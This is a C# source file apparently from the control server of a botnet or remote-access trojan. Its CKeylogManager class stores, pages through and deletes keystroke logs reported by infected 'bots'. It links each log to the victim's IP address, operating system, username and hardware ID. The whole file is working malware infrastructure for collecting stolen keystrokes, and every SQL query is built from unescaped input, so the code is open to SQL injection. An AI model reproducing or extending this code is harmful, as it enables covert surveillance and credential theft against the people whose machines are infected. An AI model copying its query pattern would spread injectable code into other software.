using Server.Core.Config;
using Server.Utilities;
using System;
using System.Data.SQLite;
using System.Text;

namespace Server.Core.Handlers
{
	/// <summary>
	/// Description of CKeylogManager.
	/// </summary>
	static class CKeylogManager
	{
        /// <summary>
        /// Get total amount of reports inside keylogger database
        /// </summary>
        /// <returns></returns>
		public static int GetTotal(string strTag)
        {
            try
            {
                string strQuery = "SELECT COUNT(*) FROM key_logs";

                if(!String.IsNullOrEmpty(strTag))
                {
                    strQuery += string.Format(" WHERE log_title LIKE '%{0}%' OR log_data LIKE '%{0}%'", strTag);
                }

                return CMain.DatabaseClient.ExecuteCountQuery(strQuery);
            }
            catch { }

            return 0;
        }

        /// <summary>
        /// Is it the first report for this title
        /// </summary>
        /// <param name="strTitle"></param>
        /// <param name="iBotID"></param>
        /// <returns></returns>
        static bool Exists(string strTitle, int iBotID)
        {
            try
            {
                int iCount = CMain.DatabaseClient.ExecuteCountQuery(
                    string.Format(
                    "SELECT COUNT(*) FROM key_logs WHERE log_title='{0}' and log_bot_id={1}",
                    strTitle, iBotID)
                    );

                return iCount > 0;
            }
            catch { }

            return false;
        }

        public static bool Add(string strTitle, string strData, int iBotID)
        {
            if (string.IsNullOrEmpty(strTitle) ||
                string.IsNullOrEmpty(strData)) return false;

            try
            {
                if(Exists(strTitle, iBotID))
                {
                    /*return CMain.DatabaseClient.ExecuteNonResultQuery(
                        string.Format(
                        "UPDATE key_logs SET log_reports=log_reports + 1, log_length=log_length + {0}, log_data=log_data + '{1}' WHERE log_title='{2}' and log_bot_id={3}",
                        strData.Length, strData, strTitle, iBotID)
                        );*/

                    SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(
                        string.Format(
                        "SELECT log_id, log_reports, log_length, log_data FROM key_logs WHERE log_title='{0}' and log_bot_id='{1}'",
                        strTitle, iBotID)
                        );

                    if(Result.HasRows)
                    {
                        if (!Result.Read()) return false;

                        int iLogID, iReports, iLength;
                        string strNewData = string.Empty;

                        if (!int.TryParse(Result[0].ToString(), out iLogID) ||
                            !int.TryParse(Result[1].ToString(), out iReports) ||
                            !int.TryParse(Result[2].ToString(), out iLength)) 
                            return false;

                        strNewData = string.Concat(Result[3].ToString(),Environment.NewLine, string.Format("Report: {0}", iReports + 1), Environment.NewLine, strData);

                        return CMain.DatabaseClient.ExecuteNonResultQuery(
                            string.Format(
                            "UPDATE key_logs SET log_reports=log_reports + 1, log_length=log_length + {0}, log_data='{1}' WHERE log_id={2}",
                            strData.Length, strNewData, iLogID)
                            );
                    }
                }
                else
                {
                    return CMain.DatabaseClient.ExecuteNonResultQuery(
                        string.Format(
                        "INSERT INTO key_logs(log_title, log_reports, log_length, log_bot_id, log_data) VALUES('{0}', 1, {1}, {2}, '{3}')",
                        strTitle, strData.Length, iBotID, strData)
                        );
                }
            }
            catch { }
            return false;
        }

        public static string GetPage(CBotHandler BotHandler, int iPage, string strTag)
        {
            try
            {
                string strQuery = "SELECT log_id, log_title, log_reports, log_length, log_bot_id FROM key_logs";

                if(!String.IsNullOrEmpty(strTag))
                {
                    strQuery += string.Format(" WHERE log_title LIKE '%{0}%' OR log_data LIKE '%{0}%'", strTag);
                }

                strQuery += string.Format(" LIMIT {0}, {1}", (iPage - 1) * CConfig.ResultsPerPage, CConfig.ResultsPerPage);
                
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(strQuery);

                if(Result.HasRows)
                {
                    var sbKeylogList = new StringBuilder();

                    while(Result.Read())
                    {
                        int iBotID = -1;

                        if (!int.TryParse(Result[4].ToString(), out iBotID)) continue;
                        
                        sbKeylogList.AppendFormat(
                            "{0}*{1}*{2}*{3}*{4}*{5};",
                            Result[0].ToString(), Convert.ToBase64String(UnicodeEncoding.Unicode.GetBytes(Result[1].ToString())), Result[2].ToString(), Result[3].ToString(), BotHandler.GetBotUsernameByID(iBotID), iBotID
                            );
                    }

                    return sbKeylogList.ToString();
                }

            }
            catch { }

            return string.Empty;
        }

        public static string GetReport(int iID)
        {
            try
            {
                SQLiteDataReader Result = CMain.DatabaseClient.ExecuteReadQuery(
                    string.Format(
                    "SELECT log_title, log_length, log_bot_id, log_data FROM key_logs WHERE log_id={0}",
                    iID)
                    );

                if(Result.HasRows && Result.Read())
                {
                    string[] arr_strReportData = new string[] 
                    { 
                        Result[0].ToString(),
                        Result[1].ToString(),
                        Result[2].ToString(),
                        Result[3].ToString(),
                        iID.ToString()
                    };

                    Result = CMain.DatabaseClient.ExecuteReadQuery(
                        string.Format(
                        "SELECT bot_ipv4, bot_os, bot_username, bot_hwid FROM bots WHERE bot_id={0}",
                        arr_strReportData[2])
                        );

                    if(Result.HasRows && Result.Read())
                    {
                        string[] arr_strBotData = new string[]
                        {
                            Result[0].ToString(),
                            Result[1].ToString(),
                            Result[2].ToString(),
                            Result[3].ToString()
                        };

                        return string.Format(
                            "{0}*{1}*{2}*{3}*{4}*{5}*{6}*{7}*{8}",
                            arr_strReportData[0], arr_strReportData[1], arr_strReportData[2], arr_strReportData[3], arr_strReportData[4],
                            arr_strBotData[0], arr_strBotData[1], arr_strBotData[2], arr_strBotData[3]
                            );
                    }
                    
                }
            }
            catch { }
            return string.Empty;
        }

        public static bool RemoveReport(int iID)
        {
            try
            {
                return CMain.DatabaseClient.ExecuteNonResultQuery(
                    string.Format(
                    "DELETE FROM key_logs WHERE log_id={0}", iID)
                    );
            }
            catch { }

            return false;
        }
	}
}
